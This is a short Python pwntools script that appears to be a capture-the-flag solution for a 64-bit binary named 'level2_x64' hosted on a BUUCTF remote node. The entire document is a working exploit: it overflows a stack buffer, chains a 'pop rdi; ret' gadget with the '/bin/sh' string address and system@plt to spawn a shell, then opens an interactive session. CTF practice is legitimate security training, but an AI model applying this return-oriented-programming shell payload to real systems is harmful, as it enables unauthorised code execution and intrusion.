from  pwn import *
context.log_level = 'debug'
# io = process('./level2_x64')
io = remote('node4.buuoj.cn',28696)
elf = ELF('./level2_x64')

bin_sh_addr = next(elf.search(b'/bin/sh'))
system_plt = elf.plt['system']
pop_rdi_ret = 0x4006b3
ret = 0x400644
payload = cyclic(0x80+8) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_plt) + p64(ret)
io.recv()
io.sendline(payload)
io.interactive()